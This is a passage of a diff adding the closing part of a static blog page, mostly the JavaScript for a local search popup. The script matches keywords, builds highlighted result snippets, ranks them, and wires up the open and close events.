+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
